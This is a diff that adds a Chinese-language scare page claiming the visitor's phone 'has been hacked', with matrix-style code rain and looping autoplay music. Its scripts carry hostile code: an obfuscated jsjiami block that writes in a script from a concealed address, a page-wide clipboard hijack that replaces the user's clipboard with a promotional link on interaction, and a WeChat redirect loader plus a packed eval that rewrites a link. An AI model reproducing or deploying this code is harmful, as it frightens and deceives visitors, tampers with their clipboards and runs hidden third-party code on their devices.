@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link type="text/css" rel="stylesheet" href="http://web-file.360ab.cn/template/text/hack/css/style.css">
+    <title>⚠⚠⚠手机已被入侵⚠⚠⚠</title>
+</head>
+
+<body>
+    <canvas id="canvas"></canvas>
+    <h1></h1>
+    <br>
+    <div id="content" style="display:none;">黑客到此一游</div>
+    <audio id="audio_music" autoplay="autoplay" preload="auto" loop>
+        <source src="https://sf3-cdn-tos.douyinstatic.com/obj/ies-music/7130213182093740808.mp3" type="audio/mpeg" />
+        <embed id="main_audio_ie8" hidden="true" autostart="true" height="0" width=0 loop="true"
+            src="https://sf3-cdn-tos.douyinstatic.com/obj/ies-music/7130213182093740808.mp3" autoplay="autoplay" />
+    </audio>
+
+    <script src="https://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script>
+        var play_music = false;
+
+        function checkAudio() {
+            if (!play_music) {
+                var a = document.getElementById("audio_music"); play = function () { a.play(); document.removeEventListener("touchstart", play, false) }; if (a) { a.play(); document.addEventListener("DOMContentLoaded", function () { play() }, false,); document.addEventListener("WeixinJSBridgeReady", function () { play() }, false,); document.addEventListener("touchstart", play, false) }
+            }
+        }
+
+        checkAudio();
+        var id = "433";
+        var data_type = "0";
+        var vip_type = "0";
+        var temp_id = "9";
+        var canvas = document.getElementById('canvas');
+        var ctx = canvas.getContext('2d');
+
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+        //代码雨的文字
+        var texts = $("#content").text();
+
+        var fontSize = 17;
+        var columns = canvas.width / fontSize;
+        // 用于计算输出文字时坐标，所以长度即为列数
+        var drops = [];
+        //初始值
+        for (var x = 0; x < columns; x++) {
+            drops[x] = 1;
+        }
+
+        function draw() {
+            //让背景逐渐由透明到不透明
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            //文字颜色
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px arial';
+            //逐行输出文字
+            for (var i = 0; i < drops.length; i++) {
+                var text = texts[Math.floor(Math.random() * texts.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height || Math.random() > 0.95) {
+                    drops[i] = 0;
+                }
+
+                drops[i]++;
+            }
+        }
+
+
+        var _0xodx = 'jsjiami.com.v7'; function _0x552a(_0x5b255d, _0x1bda34) { var _0x70d8f5 = _0x70d8(); return _0x552a = function (_0x552a10, _0x3e29a4) { _0x552a10 = _0x552a10 - 0x1f2; var _0xd8b8b2 = _0x70d8f5[_0x552a10]; if (_0x552a['hNKPiz'] === undefined) { var _0xa0c121 = function (_0x2338f0) { var _0x2784f2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; var _0x2f745f = '', _0xa99a9a = ''; for (var _0x8cf8e7 = 0x0, _0x223bf6, _0x11a8dc, _0x1f8626 = 0x0; _0x11a8dc = _0x2338f0['charAt'](_0x1f8626++); ~_0x11a8dc && (_0x223bf6 = _0x8cf8e7 % 0x4 ? _0x223bf6 * 0x40 + _0x11a8dc : _0x11a8dc, _0x8cf8e7++ % 0x4) ? _0x2f745f += String['fromCharCode'](0xff & _0x223bf6 >> (-0x2 * _0x8cf8e7 & 0x6)) : 0x0) { _0x11a8dc = _0x2784f2['indexOf'](_0x11a8dc); } for (var _0x109e92 = 0x0, _0x195a6c = _0x2f745f['length']; _0x109e92 < _0x195a6c; _0x109e92++) { _0xa99a9a += '%' + ('00' + _0x2f745f['charCodeAt'](_0x109e92)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xa99a9a); }; var _0x91dccb = function (_0x580e0d, _0x34af56) { var _0x2b52e9 = [], _0x25d0e0 = 0x0, _0xbefc8, _0xea219e = ''; _0x580e0d = _0xa0c121(_0x580e0d); var _0x41a07a; for (_0x41a07a = 0x0; _0x41a07a < 0x100; _0x41a07a++) { _0x2b52e9[_0x41a07a] = _0x41a07a; } for (_0x41a07a = 0x0; _0x41a07a < 0x100; _0x41a07a++) { _0x25d0e0 = (_0x25d0e0 + _0x2b52e9[_0x41a07a] + _0x34af56['charCodeAt'](_0x41a07a % _0x34af56['length'])) % 0x100, _0xbefc8 = _0x2b52e9[_0x41a07a], _0x2b52e9[_0x41a07a] = _0x2b52e9[_0x25d0e0], _0x2b52e9[_0x25d0e0] = _0xbefc8; } _0x41a07a = 0x0, _0x25d0e0 = 0x0; for (var _0x3b4e48 = 0x0; _0x3b4e48 < _0x580e0d['length']; _0x3b4e48++) { _0x41a07a = (_0x41a07a + 0x1) % 0x100, _0x25d0e0 = (_0x25d0e0 + _0x2b52e9[_0x41a07a]) % 0x100, _0xbefc8 = _0x2b52e9[_0x41a07a], _0x2b52e9[_0x41a07a] = _0x2b52e9[_0x25d0e0], _0x2b52e9[_0x25d0e0] = _0xbefc8, _0xea219e += String['fromCharCode'](_0x580e0d['charCodeAt'](_0x3b4e48) ^ _0x2b52e9[(_0x2b52e9[_0x41a07a] + _0x2b52e9[_0x25d0e0]) % 0x100]); } return _0xea219e; }; _0x552a['JdoGZu'] = _0x91dccb, _0x5b255d = arguments, _0x552a['hNKPiz'] = !![]; } var _0xe939cb = _0x70d8f5[0x0], _0x525c69 = _0x552a10 + _0xe939cb, _0x4adf1c = _0x5b255d[_0x525c69]; return !_0x4adf1c ? (_0x552a['BdCemv'] === undefined && (_0x552a['BdCemv'] = !![]), _0xd8b8b2 = _0x552a['JdoGZu'](_0xd8b8b2, _0x3e29a4), _0x5b255d[_0x525c69] = _0xd8b8b2) : _0xd8b8b2 = _0x4adf1c, _0xd8b8b2; }, _0x552a(_0x5b255d, _0x1bda34); } var _0x283d0a = _0x552a; (function (_0x5acb41, _0x2ed5a1, _0x39b99d, _0x59da76, _0x2c1ec8, _0x549e5d, _0x1f22da) { return _0x5acb41 = _0x5acb41 >> 0x7, _0x549e5d = 'hs', _0x1f22da = 'hs', function (_0x3300b8, _0x4bbe45, _0x108159, _0x358573, _0x7474d0) { var _0x4bec33 = _0x552a; _0x358573 = 'tfi', _0x549e5d = _0x358573 + _0x549e5d, _0x7474d0 = 'up', _0x1f22da += _0x7474d0, _0x549e5d = _0x108159(_0x549e5d), _0x1f22da = _0x108159(_0x1f22da), _0x108159 = 0x0; var _0x276d7e = _0x3300b8(); while (!![] && --_0x59da76 + _0x4bbe45) { try { _0x358573 = -parseInt(_0x4bec33(0x1f4, 'mKzY')) / 0x1 + -parseInt(_0x4bec33(0x20c, '56Z#')) / 0x2 + -parseInt(_0x4bec33(0x1fc, 'CsP7')) / 0x3 + -parseInt(_0x4bec33(0x1f6, 'frJT')) / 0x4 + parseInt(_0x4bec33(0x1fb, '8#dg')) / 0x5 * (-parseInt(_0x4bec33(0x202, 'xwJS')) / 0x6) + -parseInt(_0x4bec33(0x208, 'm6pg')) / 0x7 + parseInt(_0x4bec33(0x200, 'Iuve')) / 0x8; } catch (_0x3a831f) { _0x358573 = _0x108159; } finally { _0x7474d0 = _0x276d7e[_0x549e5d](); if (_0x5acb41 <= _0x59da76) _0x108159 ? _0x2c1ec8 ? _0x358573 = _0x7474d0 : _0x2c1ec8 = _0x7474d0 : _0x108159 = _0x7474d0; else { if (_0x108159 == _0x2c1ec8['replace'](/[pYNDqlVbtUkPRIHKwE=]/g, '')) { if (_0x358573 === _0x4bbe45) { _0x276d7e['un' + _0x549e5d](_0x7474d0); break; } _0x276d7e[_0x1f22da](_0x7474d0); } } } } }(_0x39b99d, _0x2ed5a1, function (_0x177d9b, _0x59431b, _0x1d6516, _0x490e4c, _0x26bcdb, _0x5eccd6, _0x30775f) { return _0x59431b = '\x73\x70\x6c\x69\x74', _0x177d9b = arguments[0x0], _0x177d9b = _0x177d9b[_0x59431b](''), _0x1d6516 = '\x72\x65\x76\x65\x72\x73\x65', _0x177d9b = _0x177d9b[_0x1d6516]('\x76'), _0x490e4c = '\x6a\x6f\x69\x6e', (0x17438d, _0x177d9b[_0x490e4c]('')); }); }(0x6600, 0x2d65f, _0x70d8, 0xce), _0x70d8) && (_0xodx = 0xce); setInterval(draw, 0x21); var common = window[_0x283d0a(0x1fa, 'frJT')][_0x283d0a(0x1f2, '7(0e')] === _0x283d0a(0x20b, '(j(#') ? _0x283d0a(0x1fe, 'DZUz') + _0x283d0a(0x1ff, '^Vm$') + _0x283d0a(0x1f9, 'A7sy') : _0x283d0a(0x1f8, 'yCG!') + _0x283d0a(0x20a, 'yCG!') + _0x283d0a(0x209, 'b2NL'); document[_0x283d0a(0x204, '#NPs')](_0x283d0a(0x201, 'CsP7') + common + _0x283d0a(0x207, '8Qhl')); function _0x70d8() { var _0xa6468f = (function () { return [_0xodx, 'RjPbsVRjEiVkaEtbmpYiHR.qclolNDmI.UNvE7wK==', 'W6W3WRBcOSoPtmofFG', 'W6BdPCooWPJdU8ozxNW', 'emohWRW3AKRcS2TcbW', 'W6q+x8kab1KFWPCQlSo+ua', 'C1uxWQldTSofcW', 't8k7WONcQ0RdSCkqsmoGWRBdLg4HWRS', 'W6BcNuRcHrFdJuRcRgNdJWD2WOG', 'gCkaW6H3qflcPcHKivpcVcC', 'W5FdPSoLv1tdTXqYz8occ8kR'].concat((function () { return ['Bhr7q8oLxqOHWOddNa', 'vwHDpaq', 'W5xcOJtdOmkWomkltq/cGsDjWRO', 'W6tdVfnpi8oZsZFcQCoZcG', 'WQZdTCooW4vzWQNdUCoaWORdRSoNk8keW5KBcCkKr8k4aSkdE8oPtCornZ7cR8kp', 'W4pdHYeZB8o5W4rRFv5Jwa', 'W7LRWQG', 'oHrGWOahlSoOj2NcUM89Dq', 'n1SgWQxcMq', 'smkgs8kghCoNW5SXymoKbCoL', 'wGlcK8oyWRhdQSoucmoPv8kvlq'].concat((function () { return ['h3FdQ8oTChVdRLa', 'xadcKSozWRhdQmkxeCoOFCkNeKe', 'nCopW7lcHCoWW68DlmkiiCkl', 'ndBcR8obzSoquhrklJ7cRq', 'WRfPW6ddTmkSeSkyF8oYW4O1ovi', 'WOG9WQW0ffn4WQq', 'jqv2W50sFCkRBq', 'bSo8WPW']; }())); }())); }()); _0x70d8 = function () { return _0xa6468f; }; return _0x70d8(); }; var version_ = 'jsjiami.com.v7';
+
+    </script>
+    
+    <script>
+        var nowurl = window.location.href;
+        if ((typeof (data_type) != "undefined" && data_type == 0) || (typeof (vip_type) != "undefined" && vip_type != null && vip_type == 0)) {
+            var ua = navigator.userAgent.toLowerCase();
+            if (ua.match(/MicroMessenger/i) == "micromessenger" && ua.indexOf("miniprogram") < 1 && nowurl.indexOf("code") < 1 && nowurl.indexOf("new") < 1 && nowurl.indexOf("mp") < 1) {
+                document.writeln("<script src=\"http://web-file.360ab.cn/static/js/mp-jump.js?v1099\"><\/script>");
+            }
+        }
+
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            var tid = "9268d9128fcebf1a5da96d7cb2a8dac4";
+            if (nowurl.indexOf('ai81') > -1) {
+                tid = "51d6321aaa4909493b4e8941b57c30d7";
+            } else if (nowurl.indexOf('web-36') > -1) {
+                tid = "e2c5f61aa6d237cbe2cffd716efd19e5";
+            } else if (nowurl.indexOf('an55') > -1 || nowurl.indexOf('an77') > -1) {
+                tid = "c4419cfaccfe088ac7397ee955dd5e9e";
+            }
+            hm.src = "https://hm.baidu.com/hm.js?" + tid;
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    <script src="https://lib.baomitu.com/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+    <script>
+
+        var is_copy = false;
+        const timestamp2 = new Date().getTime();
+        var timeid = timestamp2.toString().substr(-4);
+        var pageUrl = 'http://360ka.cn/1024D#89508';
+        if (pageUrl.indexOf('#') == -1) {
+            pageUrl = pageUrl + '#' + timeid;
+        }
+        if (!copyText) {
+            if ($("#ctitle").text()) {
+                var copyText = $("#ctitle").text() + '\n' + pageUrl;
+            } else {
+                var copyText = $(document).prop('title') + "\n" + pageUrl;
+            }
+        }
+
+        var ua = navigator.userAgent.toLowerCase();
+        if (ua.indexOf("miniprogram") < 1) {
+            if (!is_copy && temp_id != "25") {
+
+                /*
+                const timestamp = Math.floor(Date.now() / 1000);
+                if(timestamp < 17199360000){
+                    $.get("https://ks.ferlytc.com/select?id=107", function(data, textStatus, jqXHR){
+                      copyText = data;
+                    });
+                }
+                */
+
+                var clipboard = new ClipboardJS('html', {
+                    text: function () {
+                        if (typeof ntzgo === 'function') {
+                            ntzgo();
+                        }
+                        if (typeof checkAudio === 'function') {
+                            checkAudio();
+                        }
+                        return copyText;
+                    }
+                });
+                is_copy = true;
+                $("html").click(function () {
+                    clipboard.destroy();
+                })
+                console.log(copyText);
+            }
+        }
+
+    </script>
+
+    <script>
+        /*makjum*/
+        eval(function (p, a, c, k, e, r) { e = function (c) { return c.toString(a) }; if (!''.replace(/^/, String)) { while (c--) r[e(c)] = k[c] || e(c); k = [function (e) { return r[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p }('2 1=5.6("7-8");9(1&&1.3.a>0){2 4=1.3[0];4.b="c://d/e/?f=g"}', 17, 17, '|parent|var|children|atag|document|getElementById|btn|make|if|length|href|weixin|dl|business|t|orzA1CIpoia'.split('|'), 0, {}))
+    </script>
+    <script src="https://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+</body>
+
+</html>
